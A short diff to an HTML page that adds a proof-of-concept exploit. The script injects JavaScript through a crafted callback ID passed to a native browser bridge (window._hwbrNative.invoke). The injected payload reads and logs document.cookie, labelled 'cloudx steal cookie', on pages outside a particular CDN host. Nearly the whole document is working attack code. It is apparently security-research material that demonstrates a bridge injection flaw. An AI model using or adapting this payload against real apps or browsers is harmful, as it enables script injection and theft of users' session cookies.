@@ -2,8 +2,10 @@
 <html>
 <head></head>
 <body style="word-wrap:break-word;">
-  <script>
- 
+<script>        
+    const payload = `if (typeof window.wiseopercampaign === 'undefined') {window.wiseopercampaign = window.wiseopercampaign || {callbackFromNative: function() {console.log('cloudx hahaha')},};};if(!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn")&&!window.__cloudx_called){window.__cloudx_called=true;console.log('cloudx steal cookie : '+document.cookie);}`;
+    const callbackId = `report111'); ${payload}//`;   
+    window._hwbrNative.invoke('report', 'eventReport', callbackId, '', -1);        
  </script>
 </body>
 </html>
